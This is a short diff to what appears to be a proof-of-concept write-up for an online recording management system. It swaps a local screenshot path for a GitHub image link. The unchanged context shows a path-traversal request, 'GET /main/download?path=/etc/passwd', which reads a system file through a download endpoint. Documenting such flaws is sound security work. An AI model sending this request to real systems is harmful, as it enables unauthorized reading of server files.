@@ -16,4 +16,4 @@ title="在线录音管理系统"
 GET /main/download?path=/etc/passwd HTTP/1.1
 ```
 
-![image-20240620185830327](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20240620185830327.png)
+![image](https://github.com/hardog123/poc-exp/assets/170905460/45e5cc39-df5e-4180-8c14-de1eee4e10c2)
